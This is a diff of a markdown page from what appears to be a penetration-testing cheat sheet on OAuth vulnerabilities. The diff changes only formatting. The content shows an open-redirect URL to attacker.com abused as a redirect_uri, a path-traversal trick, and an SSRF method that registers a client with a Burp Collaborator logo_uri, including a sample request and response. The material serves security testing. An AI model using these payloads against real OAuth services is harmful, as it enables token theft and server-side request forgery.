@@ -84,18 +84,18 @@ If you are unable to successfully submit an external domain as the `redirect_uri
 
 1. Find open redirect
 
-```md
-https://server.net/post/next?path=https://attacker.com
-```
+    ```md
+    https://server.net/post/next?path=https://attacker.com
+    ```
 
 2. Use this url as `redirect_uri`&#x20;
 
-```md
-https://oauth-xxx-server.com/?client_id=123&redirect_uri=https://server.net/post/next?path=https://attacker.com[...]
-```
+    ```md
+    https://oauth-xxx-server.com/?client_id=123&redirect_uri=https://server.net/post/next?path=https://attacker.com[...]
+    ```
 
 {{< hint style=tips >}}
-Tip: the default URI will often be on an OAuth-specific path, such as `/oauth/callback`, so you can use directory traversal tricks `https://client-app.com/oauth/callback/../../example/path`
+**Tip**: the default URI will often be on an OAuth-specific path, such as `/oauth/callback`, so you can use directory traversal tricks `https://client-app.com/oauth/callback/../../example/path`
 {{< /hint >}}
 
 ### Flawed CSRF protection
@@ -115,27 +115,27 @@ Look for the mandatory `openid` scope
 1. Identify configuration file `/.well-known/openid-configuration` to get registration\_endpoint
 2. Register your own client app. In the logo\_uri add a external url for SSRF
 
-```http
-POST /reg HTTP/1.1
-Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
-Content-Type: application/json
+    ```http
+    POST /reg HTTP/1.1
+    Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
+    Content-Type: application/json
 
-{
-    "application_type": "web",
-    "client_name": "My Application",
-    "redirect_uris": [
-        "https://client-app.com/callback",
-        "https://client-app.com/callback2"
-        ],
-    "logo_uri": "https://BURP-COLLABORATOR-SUBDOMAIN"
-}
-```
+    {
+        "application_type": "web",
+        "client_name": "My Application",
+        "redirect_uris": [
+            "https://client-app.com/callback",
+            "https://client-app.com/callback2"
+            ],
+        "logo_uri": "https://BURP-COLLABORATOR-SUBDOMAIN"
+    }
+    ```
 
-```http
-HTTP/2 201 Created
-[...]
+    ```http
+    HTTP/2 201 Created
+    [...]
 
-{[...]"client_id":"aqFGUZgiQmXrUphoMV7i6","client_name":"My Application",[...]}
-```
+    {[...]"client_id":"aqFGUZgiQmXrUphoMV7i6","client_name":"My Application",[...]}
+    ```
 
 3. Make `GET /client/CLIENT-ID/logo` request and replace the `client_id`
